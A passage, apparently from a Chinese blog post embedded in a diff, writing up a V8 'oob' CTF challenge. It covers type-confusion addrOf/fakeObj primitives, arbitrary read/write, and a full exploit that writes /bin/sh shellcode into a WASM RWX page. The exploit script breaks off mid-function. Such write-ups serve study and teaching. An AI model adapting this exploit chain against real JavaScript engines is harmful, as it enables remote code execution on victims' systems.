ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#以下两部分只是为了能正常运行这个添加的函数而已</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)        \</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br></pre></td></tr></table></div></figure>
+
+<p>即添加了为数组对象<code>ArrayOob</code>添加了一个函数oob()，其功能为</p>
+<ul>
+<li>当参数只有一个(默认传入this指针)，返回数组最后一个元素之后的元素</li>
+<li>当参数有两个(除了this指针之外再传入一个参数)，就用我们传入的参数覆盖数组最后一个元素之后的元素</li>
+<li>其他情况下返回一个undefined</li>
+</ul>
+<p>即该函数可以实现<strong>读/写</strong>数组对象MAP属性</p>
+
+        <h2 id="2-漏洞分析"   >
+          <a href="#2-漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2>
+      <p>关键在于数组对象<code>ArrayOob</code>的内存空间，尝试看一下</p>
+<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line">%DebugPrint(float_array);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></div></figure>
+
+<p>调试跑起来，查看elements处的内存</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182013498.png" alt="image-20220318201300196"></p>
+<p>即在数组对象的元素之后为数组对象的结构体，之前也提到过。而对象的map如果能被修改，就能引起v8的类型混淆，之前已经提到过。</p>
+<p>那么我们利用类型混淆，来构造获取任意对象的地址的函数<code>getAddress(obj)</code>以及修改任意地址为对象的函数<code>getFakeObj(addr)</code></p>
+
+        <h3 id="1-构造转化函数"   >
+          <a href="#1-构造转化函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-构造转化函数" class="headerlink" title="(1)构造转化函数"></a>(1)构造转化函数</h3>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array.oob()</span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array.oob()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAddress</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj;<span class="comment">//设置对象数组</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//将原本是对象的map覆盖为浮点数数组的map,之后读取就会以浮点数组对象的形式读取</span></span><br><span class="line">    <span class="comment">//从对象数组中读出对象，但是此时整个对象数组已经被改成浮点数组，所以会以浮点数数组形式读取，得到该对象的地址</span></span><br><span class="line">    <span class="comment">//正常情况从对象数组中读取对象会返回一个对象，不是该对象的地址，但是转换成浮点数组就会读取到成员的地址，这就是类型混淆</span></span><br><span class="line">    <span class="keyword">let</span> addr = mem.f2i(obj_array[<span class="number">0</span>])</span><br><span class="line">    obj_array.oob(obj_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = mem.i2f(addr);<span class="comment">//设置浮点数数组</span></span><br><span class="line">    float_array.oob(obj_array_map);<span class="comment">//设置map属性将浮点数数组转化为对象数组</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取转化之后的对象数组，就能得到该fake_obj，其地址为addr，对象类型为字典对象</span></span><br><span class="line">    float_array.oob(float_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>实际测试一下</p>
+<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj_addr = getAddress(obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]obj_addr:&quot;</span>+hex(obj_addr));</span><br><span class="line">%DebugPrint(obj)</span><br><span class="line">%SystemBreak()</span><br></pre></td></tr></table></div></figure>
+
+<p>可以看到成功获取地址</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221213865.png" alt="image-20220322121328820"></p>
+<p>但是这么判断转化对象成功不太知道…</p>
+
+        <h3 id="2-利用转化函数构造任意读写"   >
+          <a href="#2-利用转化函数构造任意读写" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用转化函数构造任意读写" class="headerlink" title="(2)利用转化函数构造任意读写"></a>(2)利用转化函数构造任意读写</h3>
+      <p>得到了上述的转化函数，那么我们可以借助这两个转化函数来获取任意地址读和任意地址写</p>
+
+        <h4 id="原理："   >
+          <a href="#原理：" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4>
+      <p>利用<code>getFakeObj</code>将一个地址转化为一个浮点数组对象，而如果该地址指向的elements指针可控，那么我们就能够修改其elements指针，从而指向任意地方，去进行读写操作。</p>
+<p>需要注意的是，由于依据elements读写的时候没有进行检测，所以只要成功修改了elements指针，那么我们我们就能从elements实际存放数据的地方，也就是*(elements+0x10)处读写我们的数据，造成任意地址读写。</p>
+<p>假定申请<code>fake_array[6]</code>，如下图布局</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221519946.png" alt="未命名文件 (2)"></p>
+<p>即如上图所示，设置<code>fake_array_addr-0x40+0x10</code>的地址为一个<code>fake_obj</code>，那么该<code>fake_obj</code>相关的属性如下</p>
+<ul>
+<li><p><code>map</code>即为<code>float_array_map</code>，可以由fake_array[0]进行控制，由此可以进行元素读写</p>
+</li>
+<li><p><code>protototype</code>即设置为0，可由<code>fake_array[1]</code>进行控制</p>
+</li>
+<li><p><code>elements</code>即设置为我们需要读写的地址，可由<code>fake_array[2]</code>进行控制</p>
+</li>
+</ul>
+<p>那么即可完成整个读写布局。</p>
+
+        <h4 id="代码："   >
+          <a href="#代码：" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：" class="headerlink" title="代码："></a>代码：</h4>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    mem.i2f(<span class="number">0n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_array_addr = getAddress(fake_array);</span><br><span class="line"><span class="keyword">let</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">let</span> fake_object = getFakeObj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = mem.f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = mem.i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="测试效果："   >
+          <a href="#测试效果：" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试效果：" class="headerlink" title="测试效果："></a>测试效果：</h4>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(fake_array);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_array_addr:&quot;</span> + hex(fake_array_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_object_addr:&quot;</span> + hex(fake_object_addr));</span><br><span class="line">read64(fake_array_addr-<span class="number">0x40n</span>+<span class="number">0x28n</span>-<span class="number">1n</span>);</span><br><span class="line">write64(fake_object_addr+<span class="number">0x18n</span>-<span class="number">1n</span>,<span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></div></figure>
+
+<p>那么我们即读写fake_array[3]处的值，可以看到成功读写</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221529435.png" alt="image-20220322152925354"></p>
+
+        <h2 id="3-实际利用"   >
+          <a href="#3-实际利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-实际利用" class="headerlink" title="3.实际利用"></a>3.实际利用</h2>
+      
+        <h3 id="1-常规堆思路"   >
+          <a href="#1-常规堆思路" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常规堆思路" class="headerlink" title="(1)常规堆思路"></a>(1)常规堆思路</h3>
+      <p>通过泄露d8的ELF地址，计算其GOT表地址，任意读泄露出libc地址，然后覆盖<code>free_hook</code>为<code>system</code>函数，之后通过<code>console.log(&#39;/bin/sh\x00&#39;)</code>即可释放一个包含<code>/bin/sh</code>的堆块完成利用</p>
+<p>这个泄露地址部分有点不太好搞，随机泄露的部分没看，稳定泄露的部分不太对，获取到的不是d8中的指令地址，而是一个lib库的指令地址。</p>
+<p>🔺后面补把</p>
+
+        <h3 id="2-利用WASM机制"   >
+          <a href="#2-利用WASM机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用WASM机制" class="headerlink" title="(2)利用WASM机制"></a>(2)利用WASM机制</h3>
+      <p>如下可以将C语言直接转换为wasm并生成JS配套调用代码</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/" >WasmFiddle (wasdk.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>wasm就是一个用来调用C代码的机制，可以自己去看看，但是不能赋予危险的代码来调用，只能运行数学计算、图像处理等系统无关的高级语言代码。</p>
+<p>简单来说，我们可以创建一片WASM的空间，然后如果我们可以修改到这片运行WASM代码的内存空间(利用上述的任意写)，修改其为shellcode，然后当d8调用WASM的接口时，就可以调用到我们的shellcode了。</p>
+<p>而运行WASM代码的内存空间即为WASM_instance+0x88处</p>
+<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br></pre></td></tr></table></div></figure>
+
+<p>也就是上述的<code>wasmInstance</code>地址+0x88处</p>
+<p>其中wasmCode的功能为</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="①泄露地址"   >
+          <a href="#①泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#①泄露地址" class="headerlink" title="①泄露地址"></a>①泄露地址</h4>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_instance_addr = getAddress(wasmInstance);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwx_page_addr = read64(wasm_instance_addr -<span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr: &quot;</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="②写入shellcode到wasm的rwx段"   >
+          <a href="#②写入shellcode到wasm的rwx段" class="heading-link"><i class="fas fa-link"></i></a><a href="#②写入shellcode到wasm的rwx段" class="headerlink" title="②写入shellcode到wasm的rwx段"></a>②写入shellcode到wasm的rwx段</h4>
+      <p>这里有个问题，就是连续使用两次<code>write64</code>会出错，具体原因不清楚，说什么floatArray已经被篡改，再检测合法性会出错，被篡改成啥也不知道啊，这边有点问题，之后看能不能补上。</p>
+<p>🔺</p>
+<p>那么依据大佬的，需要进行修改，使用<code>dataview</code>来进行修改</p>
+<p>原理即为</p>
+<p>DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>（<code>backing_store</code>相当于我们的elements），修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p>
+<p>🔺</p>
+<p>不太懂</p>
+<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeAny</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(data.length * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">let</span> buf_backing_store_addr = getAddress(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[*] buf_backing_store_addr: &quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  write64(buf_backing_store_addr-<span class="number">1n</span>,addr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i)</span><br><span class="line">    data_view.setFloat64(i * <span class="number">8</span>, mem.i2f(data[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line">writeAny(rwx_page_addr,shellcode);</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="③调用wasm来执行shellcode"   >
+          <a href="#③调用wasm来执行shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#③调用wasm来执行shellcode" class="headerlink" title="③调用wasm来执行shellcode"></a>③调用wasm来执行shellcode</h4>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f();</span><br></pre></td></tr></table></div></figure>
+
+<p>直接通过这个调用即可。</p>
+
+        <h4 id="EXP"   >
+          <a href="#EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">this</span>.float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">        <span class="comment">// this.u32 = new Uint32Array(this.buf);</span></span><br><span class="line">        <span class="comment">// this.bytes = new Uint8Array(this.buf);</span></span><br><span class="line">        <span class="built_in">this</span>.bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">f2i</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.float64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bigUint64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">i2f</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.bigUint64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.float64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mem = <span class="keyword">new</span> Memory()</span><br><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array.oob()</span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array.oob()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAddress</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj;<span class="comment">//设置对象数组</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//将原本是对象的map覆盖为浮点数数组的map,之后读取就会以浮点数组对象的形式读取</span></span><br><span class="line">    <span class="comment">//从对象数组中读出对象，但是此时整个对象数组已经被改成浮点数组，所以会以浮点数数组形式读取，得到该对象的地址</span></span><br><span class="line">    <span class="comment">//正常情况从对象数组中读取对象会返回一个对象，不是该对象的地址，但是转换成浮点数组就会读取到成员的地址，这就是类型混淆</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr = mem.f2i(obj_array[<span class="number">0</span>])</span><br><span class="line">    obj_array.oob(obj_array_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = mem.i2f(addr);<span class="comment">//设置浮点数数组</span></span><br><span class="line">    float_array.oob(obj_array_map);<span class="comment">//将浮点数数组转化为对象数组</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取转化之后的对象数组，就能得到该fake_obj，其地址为addr，对象类型为字典对象</span></span><br><span class="line">    float_array.oob(float_array_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    mem.i2f(<span class="number">0n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_array_addr = getAddress(fake_array);</span><br><span class="line"><span class="keyword">let</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">let</span> fake_object = getFakeObj(fake_object_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_array_addr:&quot;</span> + hex(fake_array_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_object_addr:&quot;</span> + hex(fake_object_addr));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = mem.f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 